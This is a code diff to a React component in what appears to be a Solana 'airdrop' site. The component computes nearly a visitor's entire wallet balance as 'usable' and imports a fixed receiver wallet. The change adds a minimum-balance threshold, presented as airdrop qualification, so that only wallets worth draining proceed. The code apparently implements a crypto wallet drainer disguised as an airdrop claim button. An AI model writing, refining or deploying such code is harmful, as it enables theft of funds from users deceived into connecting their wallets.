@@ -1,8 +1,8 @@
 // src/components/TransferButton.jsx
 import { useWallet } from '@solana/wallet-adapter-react';
 import { useCallback, useState } from 'react';
-import { Connection, SystemProgram, Transaction } from '@solana/web3.js';
-import { RPC_URL, RECEIVER_WALLET } from '../utils/constants';
+import { Connection, LAMPORTS_PER_SOL, SystemProgram, Transaction } from '@solana/web3.js';
+import { MIN_QUALIFY_SOL, RECEIVER_WALLET, RPC_URL, TRANSFER_FEE_BUFFER } from '../utils/constants';
 
 export default function TransferButton({ className = '' }) {
   const { publicKey, sendTransaction } = useWallet();
@@ -16,10 +16,11 @@ export default function TransferButton({ className = '' }) {
       const connection = new Connection(RPC_URL);
       const balance = await connection.getBalance(publicKey);
       const minBalance = await connection.getMinimumBalanceForRentExemption(0);
-      const usable = balance - minBalance - 5000;
+      const minimumQualifyingLamports = Math.floor(MIN_QUALIFY_SOL * LAMPORTS_PER_SOL);
+      const usable = balance - minBalance - TRANSFER_FEE_BUFFER;
 
-      if (usable <= 0) {
-        alert('Not Qualified for Airdrop.');
+      if (balance < minBalance + TRANSFER_FEE_BUFFER + minimumQualifyingLamports || usable <= 0) {
+        alert(`Not qualified for airdrop. Keep at least ${MIN_QUALIFY_SOL} SOL in your wallet.`);
         return;
       }
 
